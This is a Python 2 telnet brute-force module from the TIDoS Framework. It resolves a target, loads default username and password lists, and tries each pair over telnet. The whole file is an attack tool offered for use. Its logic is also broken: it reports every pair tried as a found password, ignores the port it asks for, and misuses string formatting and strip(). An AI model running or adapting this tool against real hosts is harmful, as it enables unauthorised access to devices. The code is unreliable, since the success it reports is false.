#!/usr/bin/env python2
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author: @_tID
#This module requires TIDoS Framework
#https://github.com/the-Infected-Drake/TIDoS-Framework 

import os
import sys
import time
import socket
from time import sleep
import telnetlib
from colors import *

teluser = []
telpass = []

def telnetBrute0x00(ip, usernames, passwords, port, delay):
        telnet = telnetlib.Telnet(ip)
        telnet.read_until("login: ")
	for username in usernames:
	     for password in passwords:
		    try:
		        telnet.write(str(username) + "\n")
		        telnet.read_until("Password: ")
		        telnet.write(str(password) + "\n")
		        telnet.write("vt100\n")
			print G + ' [+] Username: %s | Password found: %s\n' % (username, password) + W
		        telnet.close()
		    except socket.error:
		        print R + " [-] Error: Connection failed! Port closed!" + W
		    except KeyboardInterrupt:
		        telnet.close()
			sys.exit(1)
		    except:
		        print GR+ " [*] Checking : "+C+"Username: %s | "+B+"Password: %s "+R+"...\n" % (username, password)
		        sleep(delay)

def telnetbrute(web):

	print GR+' [*] Loading module...\n'
	time.sleep(0.6)
	print R+'    ========================='
	print R+'     T E L N E T   B R U T E '
	print R+'    =========================\n'
	with open('files/brute-db/telnet/telnet_defuser.lst') as users:
		for user in users:
			user = user.strip('\n')
			teluser.append(user)
	with open('files/brute-db/telnet/telnet_defpass.lst') as users:
		for passw in users:
			passw = passw.strip('\n')
			telpass.append(passw)

	web = web.strip('https://')
	web = web.strip('http://')
	ip = socket.gethostbyname(web)
	w = raw_input(O+' [#] Use IP '+R+ip+' ? (y/n) :> ')
	if w == 'y' or w == 'Y':
		port = raw_input(O+' [#] Enter the port (eg.23) :> ')
		delay = raw_input(C+' [#] Delay between each request (eg. 0.2) :> ')
		print B+' [*] Initiating module...'
		time.sleep(1)
		print GR+' [*] Trying using default credentials...'
		telnetBrute0x00(ip, teluser, telpass, port, delay)
	elif w == 'n' or w == 'N':
		ip = raw_input(O+' [#] Enter IP :> ')
		port = raw_input(O+' [#] Enter the port (eg.23) :> ')
		delay = raw_input(C+' [#] Delay between each request (eg. 0.2) :> ')
		print B+' [*] Initiating module...'
		time.sleep(1)
		print GR+' [*] Trying using default credentials...'
		telnetBrute0x00(ip, teluser, telpass, port, delay)
	else:
		print R+' [-] Sorry fam you typed shit!'
		sleep(0.7)
	print G+' [+] Done!'

